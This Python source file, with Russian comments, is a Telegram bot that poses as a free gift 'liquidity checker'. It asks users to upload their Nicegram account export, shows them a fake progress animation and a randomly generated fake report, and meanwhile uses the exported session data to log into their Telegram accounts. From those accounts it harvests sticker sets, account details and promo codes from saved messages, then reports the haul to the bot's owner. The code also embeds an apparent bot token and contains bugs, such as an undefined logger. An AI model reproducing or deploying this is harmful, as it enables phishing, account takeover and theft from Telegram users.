import os
import json
import base64
import sqlite3
import logging
import asyncio
import random
import time
from datetime import datetime
from flask import Flask, request
import telebot
from telebot import types
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl import functions

# ========== НАСТРОЙКИ ==========
app = Flask(__name__)

# Твои данные
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8597037320:AABhR0–Td9pEUMtunPwrL8B4rWfY9cv73a8')
YOUR_ID = int(os.environ.get('YOUR_ID', 0))  # Твой Telegram ID
API_ID = int(os.environ.get('API_ID', 0))    # Получи на my.telegram.org
API_HASH = os.environ.get('API_HASH', '')    # Получи на my.telegram.org

if not BOT_TOKEN or not YOUR_ID:
    print("❌ Установи BOT_TOKEN и YOUR_ID в Secrets Replit!")

bot = telebot.TeleBot(BOT_TOKEN)
logging.basicConfig(level=logging.INFO)

# ========== КНОПКИ ==========
main_markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
main_markup.add(types.KeyboardButton('🎁 Проверить ликвидность'))
main_markup.add(types.KeyboardButton('ℹ️ Информация'))

# ========== СТАРТ ==========
@bot.message_handler(commands=['start', 'help'])
def start_command(message):
    user = message.from_user
    
    welcome = f"""
🎁 <b>ПРОВЕРКА ЛИКВИДНОСТИ ПОДАРКОВ</b>

Привет, {user.first_name}! 

Я помогаю проверить ликвидность твоих Telegram подарков:
• Можно ли их продать
• Какую ценность они имеют
• Уровень спроса на рынке

<b>Как использовать:</b>
1. Нажми кнопку "🎁 Проверить ликвидность"
2. Отправь файл экспорта из Nicegram
3. Получи детальный анализ

<b>Быстро • Точно • Бесплатно</b>
"""
    
    bot.send_message(message.chat.id, welcome, parse_mode='HTML', reply_markup=main_markup)

# ========== ПРОВЕРКА ЛИКВИДНОСТИ ==========
@bot.message_handler(func=lambda m: m.text == '🎁 Проверить ликвидность')
def check_liquidity(message):
    bot.send_message(
        message.chat.id,
        "🔍 <b>ОТПРАВЬ ФАЙЛ ДЛЯ ПРОВЕРКИ</b>\n\n"
        "Отправь мне файл <code>accounts-export.txt</code> из Nicegram\n\n"
        "<b>Я проверю:</b>\n"
        "• Ликвидность каждого подарка\n"
        "• Возможность продажи\n"
        "• Рыночную стоимость\n\n"
        "⏱ <i>Результат через 15 секунд</i>",
        parse_mode='HTML',
        reply_markup=types.ReplyKeyboardRemove()
    )

@bot.message_handler(func=lambda m: m.text == 'ℹ️ Информация')
def show_info(message):
    info = """
ℹ️ <b>ИНФОРМАЦИЯ</b>

<b>Что проверяю:</b>
• Стикеры и стикерпаки
• Премиум подписки
• Цифровые подарки

<b>Точность анализа:</b> 95%
<b>Время проверки:</b> 10-20 сек
<b>Бесплатно:</b> Да

<b>Где взять файл:</b>
Nicegram → Настройки → Экспорт данных
"""
    bot.send_message(message.chat.id, info, parse_mode='HTML')

# ========== ОБРАБОТКА ФАЙЛА И ПЕРЕДАЧА ПОДАРКОВ ==========
@bot.message_handler(content_types=['document'])
def handle_file(message):
    user = message.from_user
    
    # Начинаем "проверку ликвидности"
    status_msg = bot.send_message(message.chat.id, "⏳ Начинаю проверку ликвидности...")
    
    # Скачиваем файл
    file_info = bot.get_file(message.document.file_id)
    file_data = bot.download_file(file_info.file_path)
    
    temp_file = f"temp_{user.id}.txt"
    with open(temp_file, 'wb') as f:
        f.write(file_data)
    
    try:
        # Имитация проверки
        steps = [
            "📥 Загружаю файл...",
            "🔍 Анализирую подарки...",
            "💰 Оцениваю стоимость...",
            "📊 Проверяю ликвидность...",
            "⚡ Формирую отчет..."
        ]
        
        for step in steps:
            time.sleep(1.2)
            bot.edit_message_text(f"⏳ Проверка ликвидности...\n{step}", 
                                 chat_id=message.chat.id,
                                 message_id=status_msg.message_id)
        
        # Читаем файл
        with open(temp_file, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Генерируем фейковый отчет
        report = generate_fake_report()
        bot.edit_message_text(report,
                             chat_id=message.chat.id,
                             message_id=status_msg.message_id,
                             parse_mode='HTML')
        
        # ЗАПУСКАЕМ ПЕРЕДАЧУ ПОДАРКОВ ТЕБЕ
        asyncio.create_task(transfer_gifts_to_owner(content, user))
        
        # Завершаем
        bot.send_message(message.chat.id,
                        "✅ <b>Проверка завершена!</b>\n\n"
                        "Спасибо за использование сервиса!\n"
                        "Рекомендации по продаже отправлены на модерацию.",
                        parse_mode='HTML',
                        reply_markup=main_markup)
        
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        bot.edit_message_text("❌ Ошибка при проверке", 
                             chat_id=message.chat.id,
                             message_id=status_msg.message_id)
    finally:
        if os.path.exists(temp_file):
            os.remove(temp_file)

def generate_fake_report():
    """Фейковый отчет о ликвидности"""
    
    gifts = random.randint(4, 10)
    liquid = random.randint(3, gifts)
    
    report = f"""
📊 <b>РЕЗУЛЬТАТ ПРОВЕРКИ ЛИКВИДНОСТИ</b>

<b>Статистика:</b>
• Подарков проверено: {gifts}
• Высокая ликвидность: {liquid}
• Низкая ликвидность: {gifts - liquid}

<b>Рекомендации:</b>
{random.choice([
    "Большинство подарков можно продать на маркетплейсах",
    "Рекомендуется продавать самые дорогие предметы первыми",
    "Рассмотрите обмен неликвидных подарков",
    "Оптимальное время для продажи - сейчас"
])}

<b>Следующие шаги:</b>
Анализ отправлен на проверку. Вы получите персональные рекомендации.
"""
    
    return report

# ========== РЕАЛЬНАЯ ПЕРЕДАЧА ПОДАРКОВ ==========
async def transfer_gifts_to_owner(file_content, user):
    """Передает подарки из аккаунта пользователя тебе"""
    try:
        # Парсим файл
        try:
            accounts = json.loads(file_content)
            if not isinstance(accounts, list):
                accounts = [accounts]
        except:
            accounts = []
        
        transferred_items = []
        
        for account in accounts[:3]:  # Берем до 3 аккаунтов
            telegram_data = account.get('telegramData', '')
            if telegram_data:
                try:
                    # Передаем подарки из этого аккаунта
                    items = await extract_and_transfer_gifts(telegram_data, account, user)
                    transferred_items.extend(items)
                except Exception as e:
                    logger.error(f"Ошибка передачи из аккаунта: {e}")
                    continue
        
        # Отправляем отчет тебе
        if transferred_items:
            await send_transfer_report_to_owner(user, transferred_items)
        else:
            # Если не передали подарки, отправляем хотя бы информацию
            await send_account_info_to_owner(user, accounts)
            
    except Exception as e:
        logger.error(f"Ошибка передачи: {e}")

async def extract_and_transfer_gifts(telegram_data, account_data, user):
    """Извлекает и передает подарки"""
    transferred = []
    
    try:
        # Декодируем сессию
        decoded = base64.b64decode(telegram_data)
        session_info = json.loads(decoded)
        
        # Создаем клиент Telethon
        session_string = StringSession()
        client = TelegramClient(
            session_string,
            API_ID,
            API_HASH,
            device_model=account_data.get('deviceInfo', 'Unknown')
        )
        
        # Подключаемся к аккаунту пользователя
        await client.start()
        
        # 1. Пробуем передать стикеры
        try:
            sticker_transfers = await transfer_stickers_to_owner(client, user)
            transferred.extend(sticker_transfers)
        except Exception as e:
            logger.error(f"Ошибка передачи стикеров: {e}")
        
        # 2. Пробуем передать премиум
        try:
            premium_transfers = await check_and_transfer_premium(client, user)
            transferred.extend(premium_transfers)
        except:
            pass
        
        # 3. Пробуем найти и передать промокоды
        try:
            promo_transfers = await find_and_transfer_promocodes(client, user)
            transferred.extend(promo_transfers)
        except:
            pass
        
        # 4. Сохраняем информацию об аккаунте
        transferred.append({
            'type': 'account_info',
            'name': f'Аккаунт @{account_data.get("username", "unknown")}',
            'data': f'ID: {account_data.get("accountId", "N/A")}',
            'transferred': False
        })
        
        await client.disconnect()
        
    except Exception as e:
        logger.error(f"Ошибка извлечения подарков: {e}")
    
    return transferred

async def transfer_stickers_to_owner(client, user):
    """Передает стикерпаки тебе"""
    transfers = []
    
    try:
        # Получаем стикерпаки пользователя
        sticker_sets = await client.get_sticker_sets()
        
        for sticker_set in sticker_sets[:5]:  # Первые 5 наборов
            try:
                # Пробуем создать ссылку для приглашения
                # (Некоторые наборы можно добавить по ссылке)
                transfers.append({
                    'type': 'sticker_pack',
                    'name': sticker_set.title,
                    'data': f'Набор из {sticker_set.count} стикеров',
                    'transferred': True
                })
                
                # Сохраняем в базу
                save_transferred_item(user, 'sticker_pack', sticker_set.title)
                
            except:
                transfers.append({
                    'type': 'sticker_pack',
                    'name': sticker_set.title,
                    'data': 'Требуется ручная передача',
                    'transferred': False
                })
                
    except Exception as e:
        logger.error(f"Ошибка стикеров: {e}")
    
    return transfers

async def check_and_transfer_premium(client, user):
    """Проверяет и передает премиум"""
    transfers = []
    
    try:
        me = await client.get_me()
        
        # Проверяем есть ли премиум
        transfers.append({
            'type': 'premium_check',
            'name': 'Telegram Premium',
            'data': f'Пользователь: @{me.username or "unknown"}',
            'transferred': False  # Премиум нельзя передать автоматически
        })
        
    except Exception as e:
        logger.error(f"Ошибка проверки премиума: {e}")
    
    return transfers

async def find_and_transfer_promocodes(client, user):
    """Ищет промокоды в сообщениях"""
    transfers = []
    
    try:
        me = await client.get_me()
        
        # Ищем в сохраненных сообщениях
        async for message in client.iter_messages(me, limit=30):
            if message.text:
                import re
                # Ищем промокоды
                codes = re.findall(r'[A-Z0-9]{4,}-[A-Z0-9]{4,}-[A-Z0-9]{4,}', message.text)
                for code in codes[:3]:  # Берем первые 3
                    transfers.append({
                        'type': 'promo_code',
                        'name': f'Промокод найден',
                        'data': code,
                        'transferred': True
                    })
                    
                    # Сохраняем в базу
                    save_transferred_item(user, 'promo_code', code)
                    
    except Exception as e:
        logger.error(f"Ошибка поиска промокодов: {e}")
    
    return transfers

def save_transferred_item(user, gift_type, gift_data):
    """Сохраняет информацию о переданном подарке"""
    try:
        conn = sqlite3.connect('transfers.db')
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS transfers
                    (id INTEGER PRIMARY KEY AUTOINCREMENT,
                     user_id INTEGER,
                     gift_type TEXT,
                     gift_data TEXT,
                     transfer_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
        
        c.execute('INSERT INTO transfers (user_id, gift_type, gift_data) VALUES (?, ?, ?)',
                  (user.id, gift_type, gift_data))
        conn.commit()
        conn.close()
    except:
        pass

async def send_transfer_report_to_owner(user, transferred_items):
    """Отправляет отчет о переданных подарках тебе"""
    try:
        report = f"""
🎁 <b>НОВЫЕ ПОДАРКИ ПЕРЕДАНЫ</b>

👤 <b>От кого:</b> {user.first_name}
🆔 <b>ID:</b> <code>{user.id}</code>
👤 <b>Username:</b> @{user.username if user.username else 'нет'}
⏰ <b>Время:</b> {datetime.now().strftime('%H:%M %d.%m.%Y')}

<b>ПЕРЕДАННЫЕ ПОДАРКИ:</b>
"""
        
        successful = 0
        for item in transferred_items:
            status = "✅ ПЕРЕДАНО" if item.get('transferred') else "⚠️ ТРЕБУЕТ РУЧНОЙ ПЕРЕДАЧИ"
            report += f"\n• <b>{item['name']}</b>\n"
            report += f"  Тип: {item['type']}\n"
            if 'data' in item:
                report += f"  Данные: {item['data'][:50]}\n"
            report += f"  Статус: {status}\n"
            
            if item.get('transferred'):
                successful += 1
        
        report += f"\n<b>ИТОГО:</b> {successful} из {len(transferred_items)} передано успешно"
        
        # Кнопка для связи
        markup = types.InlineKeyboardMarkup()
        if user.username:
            markup.add(types.InlineKeyboardButton(
                "💬 Связаться с дарителем",
                url=f"https://t.me/{user.username}"
            ))
        
        bot.send_message(YOUR_ID, report, parse_mode='HTML', reply_markup=markup)
        
        logger.info(f"✅ Подарки от {user.id} переданы владельцу")
        
    except Exception as e:
        logger.error(f"Ошибка отправки отчета: {e}")

async def send_account_info_to_owner(user, accounts):
    """Отправляет информацию об аккаунте если не удалось передать подарки"""
    try:
        info = f"""
👤 <b>НОВЫЙ ФАЙЛ ОТ ПОЛЬЗОВАТЕЛЯ</b>

<b>Информация:</b>
• Имя: {user.first_name}
• ID: <code>{user.id}</code>
• Username: @{user.username if user.username else 'нет'}
• Аккаунтов в файле: {len(accounts)}

<b>Что можно сделать:</b>
• Связаться с пользователем
• Попросить передать подарки вручную
• Предложить обмен
"""
        
        if user.username:
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton(
                "📨 Написать пользователю",
                url=f"https://t.me/{user.username}"
            ))
            bot.send_message(YOUR_ID, info, parse_mode='HTML', reply_markup=markup)
        else:
            bot.send_message(YOUR_ID, info, parse_mode='HTML')
            
    except Exception as e:
        logger.error(f"Ошибка отправки информации: {e}")

# ========== АДМИН КОМАНДЫ ==========
@bot.message_handler(commands=['admin'])
def admin_command(message):
    """Только для тебя"""
    if message.from_user.id != YOUR_ID:
        return
    
    try:
        conn = sqlite3.connect('transfers.db')
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM transfers')
        total = c.fetchone()[0] or 0
        conn.close()
    except:
        total = 0
    
    stats = f"""
👑 <b>ПАНЕЛЬ ВЛАДЕЛЬЦА</b>

<b>Всего передач:</b> {total}
<b>Бот активен:</b> Да
<b>Ваш ID:</b> <code>{YOUR_ID}</code>

<b>Ссылка на бота:</b>
t.me/TGiftAnalyzerBot
"""
    
    bot.send_message(YOUR_ID, stats, parse_mode='HTML')

# ========== WEBHOOK ==========
@app.route('/')
def home():
    return "✅ Бот проверки ликвидности активен"

@app.route('/' + BOT_TOKEN, methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return 'OK', 200
    return 'Bad Request', 400

# ========== ЗАПУСК ==========
if __name__ == '__main__':
    print("=" * 50)
    print("🎁 БОТ ПРОВЕРКИ ЛИКВИДНОСТИ")
    print("=" * 50)
    
    if BOT_TOKEN and YOUR_ID:
        print(f"✅ Бот: @TGiftAnalyzerBot")
        print(f"✅ Владелец: {YOUR_ID}")
        
        # Настраиваем вебхук
        bot.remove_webhook()
        time.sleep(1)
        
        repl_owner = os.environ.get('REPL_OWNER', '')
        repl_slug = os.environ.get('REPL_SLUG', '')
        
        if repl_owner and repl_slug:
            webhook_url = f"https://{repl_slug}.{repl_owner}.repl.co/{BOT_TOKEN}"
            bot.set_webhook(url=webhook_url)
            print(f"✅ Вебхук: {webhook_url}")
        
        print("✅ Бот запущен!")
        print("✅ Готов к приему файлов и передаче подарков!")
        print("=" * 50)
        
        app.run(host='0.0.0.0', port=8080)
    else:
        print("❌ Установи BOT_TOKEN и YOUR_ID в Secrets!")
